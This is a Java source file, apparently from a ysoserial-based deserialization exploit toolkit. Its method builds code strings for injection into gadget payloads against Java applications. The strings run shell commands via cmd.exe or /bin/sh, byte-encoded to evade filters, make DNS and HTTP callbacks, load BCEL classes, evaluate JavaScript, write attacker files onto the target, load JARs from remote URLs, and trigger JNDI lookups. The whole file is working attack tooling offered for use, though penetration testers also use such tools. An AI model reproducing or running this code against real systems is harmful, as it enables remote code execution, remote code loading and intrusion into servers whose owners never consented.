package yso.payloads.custom;

import payloads.HackBCELs;
import yso.payloads.util.BASE64Decoder;
import yso.payloads.util.CommonUtil;

public class TemplatesImplUtil {
    public static String getCmd(String command) throws Exception {
        String cmd = null;
        if(command.toLowerCase().startsWith(CustomCommand.COMMAND_SLEEP)) {
            int time = Integer.valueOf(command.substring(CustomCommand.COMMAND_SLEEP.length())) * 1000;
            cmd = String.format("java.lang.Thread.sleep(%sL);",time);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_DNSLOG)){
            String dnslogDomain = command.substring(CustomCommand.COMMAND_DNSLOG.length());
            cmd = String.format("java.net.InetAddress.getAllByName(\"%s\");",dnslogDomain);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_HTTPLOG)){
            String httplogURL = command.substring(CustomCommand.COMMAND_HTTPLOG.length());
            cmd = String.format("new java.net.URL(\"%s\").getContent();",httplogURL);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_RAW_CMD)){
            String strCmd = command.substring(CustomCommand.COMMAND_RAW_CMD.length());
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            /* 转义方式转换命令在某些复杂命令下依然存在问题，改用byte/string转换方式*/
            /*cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
             */
            cmd = String.format("java.lang.Runtime.getRuntime().exec(new java.lang.String(new byte[]{%s}));",cmdByteArray);
        }  else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_WIN_CMD)){
            String strCmd = command.substring(CustomCommand.COMMAND_WIN_CMD.length());
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            cmd = String.format("String[] cmds = new String[]{\"cmd.exe\",\"/c\",new String(new byte[]{%s})};" +
                    "java.lang.Runtime.getRuntime().exec(cmds);",cmdByteArray);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_LINUX_CMD)){
            String strCmd = command.substring(CustomCommand.COMMAND_LINUX_CMD.length());
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            cmd = String.format("String[] cmds = new String[]{\"/bin/sh\",\"-c\",new String(new byte[]{%s})};" +
                    "java.lang.Runtime.getRuntime().exec(cmds);",cmdByteArray);
        }else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_AUTO_CMD)){
            /*
                String[] cmds = null;
                String osType = System.getProperty("os.name").toLowerCase();
                if(osType.contains("windows")){
                    cmds = new String[]{"cmd.exe","/c",strCmd};
                }else{
                    cmds = new String[]{"/bin/sh","-c",strCmd};
                }
                java.lang.Runtime.getRuntime().exec(cmds);
             */
            String strCmd = command.substring(CustomCommand.COMMAND_AUTO_CMD.length());
            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
            cmd = String.format("String[] cmds = null;\n" +
                    "String osType = System.getProperty(\"os.name\").toLowerCase();\n" +
                    "if(osType.contains(\"windows\")){\n" +
                    "    cmds = new String[]{\"cmd.exe\",\"/c\",new java.lang.String(new byte[]{%s})};\n" +
                    "}else{\n" +
                    "    cmds = new String[]{\"/bin/sh\",\"-c\",new java.lang.String(new byte[]{%s})};\n" +
                    "}\n" +
                    "java.lang.Runtime.getRuntime().exec(cmds);",cmdByteArray,cmdByteArray);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL)) {
            String bcel = command.substring(CustomCommand.COMMAND_BCEL.length());
            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",bcel);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE)){
            String bcelClassFile = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE.length());
            String strBCEL = HackBCELs.encode(bcelClassFile);
            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",strBCEL);
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_WITH_ARGS)){
            String tmp = command.substring(CustomCommand.COMMAND_BCEL_WITH_ARGS.length());
            String bcelStr = tmp.split("\\|")[0] ;
            String bcelArgs = tmp.split("\\|")[1];
            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").getConstructor(new Class[]{String.class}).newInstance(new String[]{new String(new byte[]{%s})});",bcelStr,CommonUtil.stringToByteArrayString(bcelArgs));
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS)){
            String tmp = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS.length());
            String bcelStr = HackBCELs.encode(tmp.split("\\|")[0]);
            String bcelArgs = tmp.split("\\|")[1];
            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").getConstructor(new Class[]{String.class}).newInstance(new String[]{new String(new byte[]{%s})});",bcelStr,CommonUtil.stringToByteArrayString(bcelArgs));
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_FILE)){
            String scriptFilePath = command.substring(CustomCommand.COMMAND_SCRIPT_FILE.length());
            String scriptFileByteCode = CommonUtil.byteToByteArrayString(CommonUtil.readFileByte(scriptFilePath));
            cmd = String.format("new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));",scriptFileByteCode);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_BASE64)){
            // Rhino jdk6 ~ jdk7
            // nashorn jdk8
            String scriptContent = command.substring(CustomCommand.COMMAND_SCRIPT_BASE64.length());
            scriptContent = new String(new BASE64Decoder().decodeBuffer(scriptContent));
            cmd = String.format("new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));",CommonUtil.stringToByteArrayString(scriptContent));
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_UPLOADFILE)){
            String cmdInfo = command.substring(CustomCommand.COMMAND_UPLOADFILE.length());
            String localFilePath = cmdInfo.split("\\|")[0];
            String remoteFilePath = cmdInfo.split("\\|")[1];
            String fileByteCode = CommonUtil.fileContextToByteArrayString(localFilePath);
            cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});",remoteFilePath,fileByteCode);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_UPLOAD_BASE64)){
            String tmp = command.substring(CustomCommand.COMMAND_UPLOAD_BASE64.length());
            String remoteFilePath = tmp.split("\\|")[0] ;
            String fileBase64Content = tmp.split("\\|")[1];
            byte[] fileContent = new BASE64Decoder().decodeBuffer(fileBase64Content);
            String fileByteCode = CommonUtil.byteToByteArrayString(fileContent);
            cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});",remoteFilePath,fileByteCode);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_LOADJAR)){
            String cmdInfo = command.substring(CustomCommand.COMMAND_LOADJAR.length());
            String jarpath = cmdInfo.split("\\|")[0];
            String className = cmdInfo.split("\\|")[1];
            cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                    "classLoader.loadClass(\"%s\").newInstance();",jarpath,className);
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_LOADJAR_WITH_ARGS)) {
            String cmdInfo = command.substring(CustomCommand.COMMAND_LOADJAR_WITH_ARGS.length());
            String jarpath = cmdInfo.split("\\|")[0];
            String className = cmdInfo.split("\\|")[1];
            String args = cmdInfo.split("\\|")[2];
            cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                    "classLoader.loadClass(\"%s\").getConstructor(String.class).newInstance(\"%s\");",jarpath,className,args);
        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)){
            String jndiURL = command.substring(CustomCommand.COMMAND_JNDI.length());
            cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");",jndiURL);
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CODE_FILE)){
            String codeFile = command.substring(CustomCommand.COMMAND_CODE_FILE.length());
            cmd = new String(CommonUtil.readFileByte(codeFile));
        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CODE_BASE64)){
            String codeBase64 = command.substring(CustomCommand.COMMAND_CODE_BASE64.length());
            cmd = new String(new BASE64Decoder().decodeBuffer(codeBase64));
        } else {
            throw new Exception(String.format("Command [%s] not supported",command));
        }
        return cmd;
    }
}
